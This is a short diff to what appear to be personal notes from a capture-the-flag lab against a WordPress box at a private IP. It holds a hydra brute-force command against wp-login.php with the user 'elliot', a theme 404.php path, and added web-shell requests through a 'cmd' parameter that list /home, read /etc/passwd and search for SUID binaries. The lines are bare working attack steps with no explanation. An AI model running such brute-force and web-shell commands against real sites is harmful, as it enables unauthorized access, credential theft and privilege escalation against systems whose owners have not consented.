@@ -3,3 +3,9 @@
 
 http://192.168.1.1/wp-content/themes/twentyfifteen/404.php
 hydra -l elliot -P fsocity_clean.dic -t 30 -V 192.168.1.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=login_error"
+
+http://192.168.1.1/test?cmd=ls%20-la%20/home
+
+http://192.168.1.1/test?cmd=cat%20/etc/passwd
+
+http://192.168.1.1/test?cmd=find%20/%20-perm%20-4000%202>/dev/null
